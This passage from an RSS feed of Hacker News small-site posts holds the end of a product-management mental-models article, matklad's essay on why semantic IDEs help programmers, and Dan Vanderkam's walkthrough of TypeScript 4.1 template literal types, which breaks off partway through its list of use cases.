introducing a new feature will lead to more users coming. Higher-order effects would include increasing technical complexity internally, cluttering and degrading the overall UX, competitors responding by copying the feature or launching a new product etc.</span></p>  <p><h2><span>Part 4: Strategy &amp; Planning</span></h2></p> <p><h3><span>Inversion</span></h3></p> <p><span>Inversion as a thinking tool turns the problem upside down. </span></p> <p><span>Instead of always starting at the beginning, sometimes it is beneficial to start at the end. This thinking can be useful in planning, where we start with the end goal and work backward. For instance, at Amazon, there is a practice of writing a …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://informedpm.com/posts/mental-models">https://informedpm.com/posts/mental-models</a></em></p>]]>
            </description>
            <link>https://informedpm.com/posts/mental-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059450</guid>
            <pubDate>Wed, 11 Nov 2020 16:04:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why an IDE?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059374">thread link</a>) | @matklad
<br/>
November 11, 2020 | https://matklad.github.io/2020/11/11/yde.html | <a href="https://web.archive.org/web/*/https://matklad.github.io/2020/11/11/yde.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io/2020/11/11/yde.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059374</guid>
            <pubDate>Wed, 11 Nov 2020 15:56:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TypeScript splits the atom A first look at TS 4.1's new template literal types]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059336">thread link</a>) | @danvk
<br/>
November 11, 2020 | https://effectivetypescript.com/2020/11/05/template-literal-types/ | <a href="https://web.archive.org/web/*/https://effectivetypescript.com/2020/11/05/template-literal-types/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><img src="https://effectivetypescript.com/images/split-atom.png" width="324" height="298" alt="Splitting a string type"></p><p>TypeScript's type system has grown steadily more powerful over the past five years, allowing you to precisely type more and more patterns in JavaScript. The upcoming <a href="https://github.com/microsoft/TypeScript/issues/40124" target="_blank" rel="noopener" onclick="return trackOutboundLink('', 'https://github.com/microsoft/TypeScript/issues/40124', event);">TypeScript 4.1 release</a> includes a particularly exciting new <a href="https://github.com/microsoft/TypeScript/pull/40336" target="_blank" rel="noopener" onclick="return trackOutboundLink('', 'https://github.com/microsoft/TypeScript/pull/40336', event);">addition</a> to the type system: <em>template literal types</em>.</p>
<p>Template literal types solve a <a href="https://github.com/microsoft/TypeScript/issues/12754" target="_blank" rel="noopener" onclick="return trackOutboundLink('', 'https://github.com/microsoft/TypeScript/issues/12754', event);">long-standing gap</a> in TypeScript's type system and, as I'll argue at the end of the post, they solve it in a particularly <em>TypeScripty</em> way.</p>
<p>To understand template literal types, let's start with a seemingly simple question: what can't you type?</p>
<h2 id="The-limits-of-type-safety-in-TypeScript"><a href="#The-limits-of-type-safety-in-TypeScript" title="The limits of type safety in TypeScript"></a>The limits of type safety in TypeScript</h2><p>My standard example of a pattern you <em>couldn't</em> type has always been the <code>camelCase</code> function, which maps something like <code>"foo_bar"</code> → <code>"fooBar"</code>. It's easy to implement in JavaScript using a regular expression:</p>
<figure><div><pre><code><span><span>function</span> <span>camelCase</span>(<span>term</span>) </span>{<br>  <span>return</span> term.replace(<span>/_([a-z])/g</span>, <span><span>m</span> =&gt;</span> m[<span>1</span>].toUpperCase());<br>}<br></code></pre></div></figure>

<p>This function is trivial to <em>simply</em> type:</p>
<figure><div><pre><code><span>declare</span> <span><span>function</span> <span>camelCase</span>(<span>term: <span>string</span></span>): <span>string</span></span>;<br></code></pre></div></figure>

<p>So that's not quite what I'm getting at. Ideally you'd like to be able to use this to convert objects with <code>snake_cased</code> properties (like you'd get from a database) into one with <code>camelCased</code> properties (like you typically use in JS/TS). In other words, what should the return type of this function be to make the following code type check (or not) as you'd expect?</p>
<figure><div><pre><code><span><span>function</span> <span>objectToCamel</span>&lt;<span>T</span> <span>extends</span> <span>object</span>&gt;(<span>obj: T</span>) </span>{<br>  <span>const</span> out: <span>any</span> = {};<br>  <span>for</span> (<span>const</span> [k, v] of <span>Object</span>.entries(obj)) {<br>    out[camelCase(k)] = v;<br>  }<br>  <span>return</span> out;<br>}<p><span>const</span> snake = {foo_bar: <span>12</span>}; <br><span>const</span> camel = objectToCamel(snake);<br><br><span>const</span> val = camel.fooBar;  <br><span>const</span> val2 = camel.foo_bar;  </p></code></pre></div></figure>

<p>Prior to TypeScript 4.1 (now a release candidate) this just wasn't possible. The reason was that string literal types like <code>"foo_bar"</code> were "atomic" in the sense that you couldn't observe any structure inside of them. They were indivisible. But clearly there <em>is</em> structure in strings. Just look at <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Instance_methods" target="_blank" rel="noopener" onclick="return trackOutboundLink('the limits of type safety in typescript', 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Instance_methods', event);">all the methods</a> on <code>String.prototype</code>.</p>
<p>Enter: TypeScript 4.1!</p>
<h2 id="TypeScript-splits-the-atom"><a href="#TypeScript-splits-the-atom" title="TypeScript splits the atom"></a>TypeScript splits the atom</h2><p>TypeScript 4.1 introduce a few features that make it possible to precisely type the <code>objectToCamel</code> function:</p>
<ol>
<li><em>Template literal types</em> This is the key advance. Template literal types allow you to find structure inside string literal types and create infinite, strict subsets of <code>string</code> (think "strings starting with <code>on</code>").</li>
<li><em>Key Remapping in Mapped Types</em> While it was possible to change the keys in an object before using tricks like <a href="https://effectivetypescript.com/2020/05/12/unionize-objectify/">Unionize and Objectify</a>, this new feature makes it much more straightforward.</li>
</ol>
<p>Let's use these two features to implement <code>objectToCamel</code>.</p>
<p>First, let's look at template literal types. They look like ES template literals:</p>
<figure><div><pre><code><span>type</span> OnString = <span>`on<span>${<span>string</span>}</span>`</span>;<br><span>const</span> onClick: OnString = <span>'onClick'</span>;<br><span>const</span> handleClick: OnString = <span>'handleClick'</span>;<br>   <br></code></pre></div></figure>

<p>This lets you create a type for "strings starting with <code>on</code>." Before TypeScript 4.1, you either had <code>string</code> or an enumerated union of string literal types (<code>"a" | "b" | "c"</code>). Now you can define structured subsets of <code>string</code>.</p>
<p>Here are a few other patterns:</p>
<figure><div><pre><code><span>type</span> IdNum = <span>`id<span>${<span>number</span>}</span>`</span>;<br><span>const</span> id1: IdNum = <span>'id123'</span>;  <br><span>const</span> id2: IdNum = <span>'idABC'</span>;   <p><span>type</span> Digit = <span>'0'</span> | <span>'1'</span> | <span>'2'</span> | <span>'3'</span> | <span>'4'</span> |<br>             <span>'5'</span> | <span>'6'</span> | <span>'7'</span> | <span>'8'</span> | <span>'9'</span>;<br><span>type</span> ThreeDigitNum = <span>`<span>${Digit}</span><span>${Digit}</span><span>${Digit}</span>`</span>;</p></code></pre></div></figure>

<p>What makes this really powerful is that you can use the <a href="https://artsy.github.io/blog/2018/11/21/conditional-types-in-typescript/" target="_blank" rel="noopener" onclick="return trackOutboundLink('typescript splits the atom', 'https://artsy.github.io/blog/2018/11/21/conditional-types-in-typescript/', event);"><code>infer</code> keyword</a> in a template literal type to do pattern matching:</p>
<figure><div><pre><code><span>type</span> ToCamel1&lt;S <span>extends</span> <span>string</span>&gt; =<br>    S <span>extends</span> <span>`<span>${infer Head}</span>_<span>${infer Tail}</span>`</span><br>    ? <span>`<span>${Head}</span><span>${Capitalize&lt;Tail&gt;}</span>`</span><br>    : S;<p><span>type</span> T = ToCamel1&lt;<span>'foo_bar'</span>&gt;;  </p></code></pre></div></figure>

<p>The conditional matches string literal types of the form <code>"head_tail"</code>. The "<code>_</code>" acts as a delimiter to split the string. Because <a href="https://mariusschulz.com/blog/conditional-types-in-typescript#distributive-conditional-types" target="_blank" rel="noopener" onclick="return trackOutboundLink('typescript splits the atom', 'https://mariusschulz.com/blog/conditional-types-in-typescript#distributive-conditional-types', event);">conditional types distribute over unions</a>, this also works for union types:</p>
<figure><div><pre><code><span>type</span> TU = ToCamel1&lt;<span>'first_name'</span> | <span>'last_name'</span>&gt;;<br><br></code></pre></div></figure>

<p>There's a big issue, though. What if there's two <code>_</code>s in the string literal type?</p>
<figure><div><pre><code><span>type</span> T2 = ToCamel1&lt;<span>'foo_bar_baz'</span>&gt;;  <br></code></pre></div></figure>

<p>We can't stop after the first "<code>_</code>", we need to keep going. We can do this by making the type recursive:</p>
<figure><div><pre><code><span>type</span> ToCamel&lt;S <span>extends</span> <span>string</span>&gt; =<br>    S <span>extends</span> <span>`<span>${infer Head}</span>_<span>${infer Tail}</span>`</span><br>    ? <span>`<span>${Head}</span><span>${Capitalize&lt;ToCamel&lt;Tail&gt;&gt;}</span>`</span><br>    : S;<br><span>type</span> T0 = ToCamel&lt;<span>'foo'</span>&gt;;  <br><span>type</span> T1 = ToCamel&lt;<span>'foo_bar'</span>&gt;;  <br><span>type</span> T2 = ToCamel&lt;<span>'foo_bar_baz'</span>&gt;;  <br></code></pre></div></figure>

<p>The recursive bit is where we call <code>ToCamel&lt;Tail&gt;</code>.</p>
<p>Pretty neat! Now let's put it all together.</p>
<h2 id="A-typed-objectToCamel"><a href="#A-typed-objectToCamel" title="A typed objectToCamel"></a>A typed objectToCamel</h2><p>Recall that a <a href="https://medium.com/@danvdk/a-typed-pluck-exploring-typescript-2-1s-mapped-types-c15f72bf4ca8" target="_blank" rel="noopener" onclick="return trackOutboundLink('a typed objecttocamel', 'https://medium.com/@danvdk/a-typed-pluck-exploring-typescript-2-1s-mapped-types-c15f72bf4ca8', event);">mapped type</a> in TypeScript looks and works something like this:</p>
<figure><div><pre><code><span>interface</span> Vector {<br>  x: <span>number</span>;<br>  y: <span>number</span>;<br>}<br><span>type</span> Promisify&lt;T <span>extends</span> object&gt; = {<br>  [K <span>in</span> keyof T]: <span>Promise</span>&lt;T[K]&gt;  <br>};<br><span>type</span> VectorPromise = Promisify&lt;Vector&gt;;<br><br></code></pre></div></figure>

<p>The <code>keyof T</code> here produces a union of string literal types (<code>"x" | "y"</code>) and the mapped type produces an object type from this given a way to produce the values (the <code>Promise&lt;T[K]&gt;</code>). But the keys are set by the union. You can't change them.</p>
<p>With Key Remapping, you can add an <code>as</code> clause to the key in a mapped type to change things around. This works particularly well with template literal types:</p>
<figure><div><pre><code><span>interface</span> Student {<br>  name: <span>string</span>;<br>  age: <span>number</span>;<br>}<br><span>type</span> Evented&lt;T <span>extends</span> object&gt; = {<br>  [K <span>in</span> keyof T <span>as</span> <span>`<span>${K &amp; <span>string</span>}</span>Changed`</span>]: <span>(<span>val: T[K]</span>) =&gt;</span> <span>void</span>;<br>}<br><span>type</span> StudentEvents = Evented&lt;Student&gt;;<br><br><br><br><br></code></pre></div></figure>

<p>(The <code>&amp; string</code> is there for technical reasons that I don't want to get into.)</p>
<p>Using this, we can plug in our <code>ToCamel</code> generic to put it all together:</p>
<figure><div><pre><code><span>type</span> ObjectToCamel&lt;T <span>extends</span> object&gt; = {<br>  [K <span>in</span> keyof T <span>as</span> ToCamel&lt;K&gt;]: T[K]<br>};<p><span><span>function</span> <span>objectToCamel</span>&lt;<span>T</span> <span>extends</span> <span>object</span>&gt;(<span>obj: T</span>): <span>ObjectToCamel</span>&lt;<span>T</span>&gt; </span>{<br>  <br>}</p><p><span>const</span> snake = {foo_bar: <span>12</span>}; <br><span>const</span> camel = objectToCamel(snake);<br><br><span>const</span> val = camel.fooBar;  <br><span>const</span> val2 = camel.foo_bar;<br>                <br>                </p></code></pre></div></figure>

<p>Here's a <a href="https://www.typescriptlang.org/play?ts=4.2.0-dev.20201109#code/C4TwDgpgBAKg9gYQIYFsIBsA8BlKEAewEAdgCYDOU5wATgJbEDmAfFALwBQU3UuBRZSgAMAJAG8GAMwg0oACQhJSAXwD64qTNhI66ZUK48A-FFFiFS5eORg6wJOjoAvCJnjI0WGDvTNm+w24ALl4Abg5QSFgABnZYRFQMTABySTg4ZOZQ7gB6HKhI6DpKACI0uBKI8GgYAEY490SsVPTVACMkGkzsqDyC6qhiqDL0gCFOysLYACYGhM8U8vbO5adu3PypoZG4cZpxp0qOSQBXYgBjYDo4YihzpuRyVxg8QhIKKloGFgAKIhoUCEYABKIHzJIwVhiQw0CDAE40W7-FAAOlhYHQSHOEB+OVUPwA2kgALROAC6wJyjAANFAUOxWCgCbUySjgHAAKpgSA0R444HAqBISiNBaQ8LKDhVKIAeTaACsIJdRRDXgIPnAFUrgKw2FBodwCQBpQa3ADWEBAcEksCFIvBWBNADJPvQmMwyUDjWSOMpwsczpdrrdNYrlQ63Gr3pRQ9rmD9Q0DQVA5WHgCqvFDDOcbtQoHATsAQkhiCA4mI-YY0rIfjniHmCWbaQA3Mn5m2p7UokhfCDkBMKgX6wL5wsE+6ePk-M3Att65vhbiS7iw+GI0fACVSut5sDC+7octLDo0EK1aZ+3qbAZDMTHzohYgnFBtGSSnfAO5NOKx8MeDA-Hu5AHsC4R9FslBiFA5R7I+z6vrI765p+zYOHEE4YCiMGdD04E3pQT4vjIHAflAqHoLMeoYegWGtCei48IxTE8H0AB+7EcaxUAAAo0HAPKgFALRwMsXRQKQcB9lAxBwJ+BDFJ+Nz9JAI7McxfRqUJUHYae0nwTI2TKMkKJQAAInQpBQFaJx0ootzCXsyRGBwQA" target="_blank" rel="noopener" onclick="return trackOutboundLink('a typed objecttocamel', 'https://www.typescriptlang.org/play?ts=4.2.0-dev.20201109#code/C4TwDgpgBAKg9gYQIYFsIBsA8BlKEAewEAdgCYDOU5wATgJbEDmAfFALwBQU3UuBRZSgAMAJAG8GAMwg0oACQhJSAXwD64qTNhI66ZUK48A-FFFiFS5eORg6wJOjoAvCJnjI0WGDvTNm+w24ALl4Abg5QSFgABnZYRFQMTABySTg4ZOZQ7gB6HKhI6DpKACI0uBKI8GgYAEY490SsVPTVACMkGkzsqDyC6qhiqDL0gCFOysLYACYGhM8U8vbO5adu3PypoZG4cZpxp0qOSQBXYgBjYDo4YihzpuRyVxg8QhIKKloGFgAKIhoUCEYABKIHzJIwVhiQw0CDAE40W7-FAAOlhYHQSHOEB+OVUPwA2kgALROAC6wJyjAANFAUOxWCgCbUySjgHAAKpgSA0R444HAqBISiNBaQ8LKDhVKIAeTaACsIJdRRDXgIPnAFUrgKw2FBodwCQBpQa3ADWEBAcEksCFIvBWBNADJPvQmMwyUDjWSOMpwsczpdrrdNYrlQ63Gr3pRQ9rmD9Q0DQVA5WHgCqvFDDOcbtQoHATsAQkhiCA4mI-YY0rIfjniHmCWbaQA3Mn5m2p7UokhfCDkBMKgX6wL5wsE+6ePk-M3Att65vhbiS7iw+GI0fACVSut5sDC+7octLDo0EK1aZ+3qbAZDMTHzohYgnFBtGSSnfAO5NOKx8MeDA-Hu5AHsC4R9FslBiFA5R7I+z6vrI765p+zYOHEE4YCiMGdD04E3pQT4vjIHAflAqHoLMeoYegWGtCei48IxTE8H0AB+7EcaxUAAAo0HAPKgFALRwMsXRQKQcB9lAxBwJ+BDFJ+Nz9JAI7McxfRqUJUHYae0nwTI2TKMkKJQAAInQpBQFaJx0ootzCXsyRGBwQA', event);">complete playground</a>.</p>
<h2 id="What-can-should-you-do-with-template-literal-types"><a href="#What-can-should-you-do-with-template-literal-types" title="What can should you do with template literal types?"></a>What <del>can</del> should you do with template literal types?</h2><p>After template literal types landed, the TypeScript Twittersphere went crazy. I shared a use case around <a href="https://expressjs.com/en/guide/routing.html" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://expressjs.com/en/guide/routing.html', event);">express</a>, which quickly became the most popular tweet I've ever posted:</p>
<blockquote><p lang="en" dir="ltr">Another use of <a href="https://twitter.com/typescript?ref_src=twsrc%5Etfw" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://twitter.com/typescript?ref_src=twsrc%5Etfw', event);">@TypeScript</a> 4.1's template literal types: extracting the URL parameters from an express route. Pretty amazing you can do this in the type system! <a href="https://t.co/gfZQy70whg" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://t.co/gfZQy70whg', event);">https://t.co/gfZQy70whg</a> <a href="https://t.co/aEyfMwjjqX" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://t.co/aEyfMwjjqX', event);">pic.twitter.com/aEyfMwjjqX</a></p>— Dan Vanderkam (@danvdk) <a href="https://twitter.com/danvdk/status/1301707026507198464?ref_src=twsrc%5Etfw" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://twitter.com/danvdk/status/1301707026507198464?ref_src=twsrc%5Etfw', event);">September 4, 2020</a></blockquote> 

<p>A <a href="https://twitter.com/buildsghost/status/1301976526603206657" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://twitter.com/buildsghost/status/1301976526603206657', event);">JSON parser</a> made the rounds and then someone <a href="https://github.com/codemix/ts-sql" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/codemix/ts-sql', event);">implemented a full SQL engine</a> in the type system. Hacker news <a href="https://news.ycombinator.com/item?id=24615185" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://news.ycombinator.com/item?id=24615185', event);">was impressed</a>.</p>
<p>As with any new tool, it will take some time for the community to figure out the best ways to use it. Here are a few ideas. We'll see how they pan out!</p>
<ul>
<li><p>Dotted access: <strong>easy win</strong></p>
<p>Lodash allows you to write <a href="https://stackoverflow.com/a/43395675/388951" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://stackoverflow.com/a/43395675/388951', event);">"iteratee" expressions</a> like <code>xs.map('a.b.c')</code>, which is roughly the same as <code>xs.map(x =&gt; x.a.b.c)</code>. Template literal types will make it possible for this sort of API to be typed.</p>
<p>I've never been a big fan of this style. I'd prefer to write <code>x =&gt; x.a.b.c</code>. But perhaps some of this is just bias from not being able to type these properly in the past. Using string literals for enums, for example, is frowned upon in Java as unsafe, <a href="https://cocoacasts.com/the-danger-of-string-literals-and-stringly-typed-code" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://cocoacasts.com/the-danger-of-string-literals-and-stringly-typed-code', event);">stringly typed</a>, code. But it turns out to be fine in TypeScript because the type system is rich enough to capture it. So we'll see!</p>
</li>
<li><p>Parsing routes: <strong>huge win!</strong></p>
<p>See my tweet above. Parsing <code>{userId: string}</code> out of <code>/users/:userId</code> will be a big win for express users.</p>
<p>Going the other direction is also compelling. In a server I use at work, we issue API calls via something like <code>get('/users/:userId', {userId: 'id'})</code>. We have types defined for the parameters for each route. But now we can just let TypeScript infer them to ensure that nothing will ever get out of sync.</p>
<p>Similar considerations apply to routes with <a href="https://reactrouter.com/web/example/url-params" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://reactrouter.com/web/example/url-params', event);">react-router</a>.</p>
</li>
<li><p>Better types for <code>querySelector</code> / <code>querySelectorAll</code>: <strong>nice win</strong></p>
<p>The <a href="https://github.com/microsoft/TypeScript/blob/b5b0437a86661c8d7bc76c5860c07305df17899c/lib/lib.dom.d.ts#L11341-L11349" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/microsoft/TypeScript/blob/b5b0437a86661c8d7bc76c5860c07305df17899c/lib/lib.dom.d.ts#L11341-L11349', event);">DOM typings</a> are clever enough to infer a subtype of <code>Element</code> here:</p>
<figure><div><pre><code><span>const</span> input = <span>document</span>.queryQuerySelector(<span>'input'</span>);<br><br></code></pre></div></figure>

<p>But once you add anything more complex to the selector, you lose this:</p>
<figure><div><pre><code><span>const</span> input = <span>document</span>.queryQuerySelector(<span>'input.my-class'</span>);<br><br></code></pre></div></figure>

<p>With template literal types, it will be possible to fix this. I wouldn't be surprised if it becomes common practice to replace calls to <code>getElementById</code> with equivalent calls to <code>querySelector</code>:</p>
<figure><div><pre><code><span>const</span> el1 = <span>document</span>.getElementById(<span>'foo'</span>);<br><br><span>const</span> div = <span>document</span>.querySelector(<span>'div#foo'</span>);<br><br></code></pre></div></figure>

<p>This will no doubt require me to rewrite Item 55 of <a href="https://amzn.to/38s1oCK" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://amzn.to/38s1oCK', event);"><em>Effective TypeScript</em></a> ("Understand the DOM hierarchy"). Oh well!</p>
</li>
<li><p>Parsing options in <a href="https://www.npmjs.com/package/commander" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://www.npmjs.com/package/commander', event);">Commander</a> or <a href="https://github.com/docopt/docopt.coffee" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/docopt/docopt.coffee', event);">docopt</a>: <strong>a small win</strong></p>
<p>With <a href="https://www.npmjs.com/package/commander" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://www.npmjs.com/package/commander', event);">Commander</a>, you define your command line tool's arguments using something like this:</p>
<figure><div><pre><code>program<br>  .option(<span>'-d, --debug'</span>, <span>'output extra debugging'</span>)<br>  .option(<span>'-s, --small'</span>, <span>'small pizza size'</span>)<br>program.parse(process.argv);<br><span>console</span>.log(program.debug, program.small);<br></code></pre></div></figure>

<p>Setting aside the mutation style, which is hard to model in TypeScript, template literal types should make it possible to extract the parameter names from the calls to <code>.option</code>.</p>
</li>
<li><p>Parsing SQL or GraphQL: <strong>I could go either way!</strong></p>
